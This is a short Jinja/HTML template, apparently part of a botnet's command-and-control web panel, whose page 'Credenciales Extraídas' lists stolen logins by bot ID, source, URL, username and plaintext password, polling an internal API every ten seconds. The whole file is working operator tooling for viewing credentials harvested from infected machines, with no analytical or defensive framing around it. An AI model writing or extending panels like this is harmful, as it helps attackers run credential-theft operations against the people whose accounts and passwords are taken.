{% extends "base.html" %}

{% block title %}Credenciales{% endblock %}

{% block content %}
<div class="section-header">
    <h2><i class="fas fa-key"></i> Credenciales Extraídas</h2>
    <button class="btn" onclick="loadCredentials()"><i class="fas fa-sync"></i></button>
</div>

<table class="data-table">
    <thead>
        <tr>
            <th>Bot ID</th>
            <th>Fuente</th>
            <th>URL</th>
            <th>Usuario</th>
            <th>Password</th>
            <th>Fecha</th>
        </tr>
    </thead>
    <tbody id="creds-tbody"></tbody>
</table>
{% endblock %}

{% block scripts %}
<script>
async function loadCredentials() {
    try {
        const resp = await fetch('/api/panel/credentials');
        const creds = await resp.json();
        
        document.getElementById('creds-tbody').innerHTML = creds.map(c => `
            <tr>
                <td><code>${c.bot_id.substring(0,12)}...</code></td>
                <td><span class="source-badge ${c.source}">${c.source}</span></td>
                <td>${c.url || '-'}</td>
                <td>${c.username || '-'}</td>
                <td><code class="password">${c.password || '-'}</code></td>
                <td>${new Date(c.timestamp).toLocaleString()}</td>
            </tr>
        `).join('');
    } catch(e) {}
}

loadCredentials();
setInterval(loadCredentials, 10000);
</script>
{% endblock %}
